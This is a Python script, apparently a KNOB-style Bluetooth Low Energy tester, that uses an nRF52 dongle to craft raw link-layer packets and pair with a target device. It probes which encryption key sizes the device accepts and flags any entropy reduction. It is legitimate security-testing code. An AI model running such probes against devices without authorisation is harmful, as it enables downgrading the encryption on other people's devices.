#!/usr/bin/python 
import os
import platform
import sys
from time import sleep

# extra libs
sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/libs')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/../libs')
sys.path.insert(0, os.getcwd() + '/../')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from timeout_lib import start_timeout, disable_timeout, update_timeout

# Default master address
master_address = '5d:36:ac:90:0b:20'
access_address = 0x9a328370
# Normal pairing request for secure pairing (uncomment the following to choose pairing request method)
# pairing_iocap = 0x01  # DisplayYesNo
# pairing_iocap = 0x03  # NoInputNoOutput
pairing_iocap = 0x04  # KeyboardDisplay
# paring_auth_request = 0x00  # No bounding
# paring_auth_request = 0x01  # Bounding
# paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
# paring_auth_request = 0x04 | 0x01  # MITM + bounding
paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding

# Internal vars
SCAN_TIMEOUT = 2
none_count = 0
end_connection = False
connecting = False
current_key_size = 6
accepted_keys = []

# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].upper()
else:
    advertiser_address = 'A4:C1:38:D8:AD:B8'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.lower())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
          ' received\nThe device may have crashed!!!')
    disable_timeout('scan_timeout')


def scan_timeout():
    global connecting
    connecting = False
    scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)


def set_security_settings(pkt):
    global paring_auth_request
    # Change security parameters according to slave security request
    # paring_auth_request = pkt[SM_Security_Request].authentication
    print(Fore.YELLOW + 'Slave requested authentication of ' + hex(pkt[SM_Security_Request].authentication))
    print(Fore.YELLOW + 'We are using authentication of ' + hex(paring_auth_request))


def send_termination_indication():
    pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
    driver.send(pkt)


def check_range(array, left, right):
    return len([x for x in array if left <= x <= right]) > 0


def send_pairing_request():
    pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
        iocap=pairing_iocap,
        oob=0,
        authentication=paring_auth_request,
        max_key_size=current_key_size,
        initiator_key_distribution=0x07,
        responder_key_distribution=0x07)
    driver.send(pairing_req)


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='knob_ble_tester.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)  # Receive plain text Link Layer
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            update_timeout('scan_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])

        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if BTLE_SCAN_RSP in pkt and pkt.AdvA == advertiser_address.lower() and connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            disable_timeout('crash_timeout')
            conn_rx_packet_counter = 0
            conn_tx_packet_counter = 0
            encryption_enabled = False
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=pkt.TxAdd, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden by
            # them!!!
            driver.send(conn_request)


        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
            if SM_Security_Request in pkt:
                set_security_settings(pkt)
            if LL_VERSION_IND in pkt:
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
                driver.send(pkt)
            # Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)

        elif SM_Security_Request in pkt:
            set_security_settings(pkt)

        elif LL_FEATURE_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
            driver.send(pkt)

        elif ATT_Exchange_MTU_Response in pkt:
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            send_pairing_request()

        elif LL_LENGTH_REQ in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)
            send_pairing_request()

        # THE ATTACK STARTS HERE !!!!
        elif SM_Pairing_Response in pkt:
            # Pairing request accepted
            # ediv and rand are 0 on first time pairing
            end_connection = True
            print(Fore.YELLOW + 'Slave accepted key size of ' + str(current_key_size))
            accepted_keys.append(current_key_size)
            current_key_size += 1
            send_termination_indication()

        elif LL_REJECT_IND in pkt or SM_Failed in pkt:
            print(Fore.GREEN + 'Slave rejected key size of ' + str(current_key_size))
            current_key_size += 1
            end_connection = True
            send_termination_indication()

        if end_connection == True:
            end_connection = False
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset')

            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)
            start_timeout('crash_timeout', 7, crash_timeout)

        if current_key_size > 17:
            print(Fore.MAGENTA + 'Key sizes accepted by peripheral: ' + str(accepted_keys))

            if check_range(accepted_keys, 0, 6):
                print(Fore.RED + 'Peripheral accepts key size lower than 7!!!')

            elif check_range(accepted_keys, 7, 15):
                print(Fore.RED + 'Peripheral allows key entropy reduction. The key size range is '
                                 '[' + str(min(accepted_keys)) + ',' + str(max(accepted_keys)) + ']')
            elif check_range(accepted_keys, 16, 17):
                print(Fore.RED + 'Peripheral accepts key size greater than 16. Non-compliance!!!')
            elif check_range(accepted_keys, 16, 16) and not check_range(accepted_keys, 7, 15):
                print(Fore.GREEN + 'Peripheral only accepts key size of 16. We are good to go!!!')
            else:
                print(Fore.RED + 'Something went wrong during testing, check if the peripheral accepts pairing')

            print(Fore.YELLOW + 'Test finished')
            exit(0)

sleep(0.01)
